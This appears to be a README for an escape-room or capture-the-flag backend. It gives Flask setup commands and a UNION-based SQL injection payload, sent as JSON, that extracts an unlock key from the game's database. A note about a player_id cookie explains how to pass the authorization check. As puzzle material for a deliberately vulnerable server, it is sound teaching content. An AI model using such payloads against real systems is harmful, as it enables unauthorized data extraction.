# Escape Room / CTF Backend

## Running the Project

To set up and run the server, execute the following commands in your terminal:

```bash
cd server
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
flask --app app.py --debug run
```

## Payload for SQL Injection

Use the following JSON payload to trigger the SQL injection and extract the unlock key:

```json
{
  "sensor_value": "abc\" union select unlock_key from GAME_PHASE where name=\"BACKEND_PUZZLE"
}
```

> **Important Note:** Remember to log in before sending the payload. You must include a valid user ID in the `player_id` cookie to bypass the authorization check. If the injection is successful, the server's response will contain the unlock key for the backend puzzle.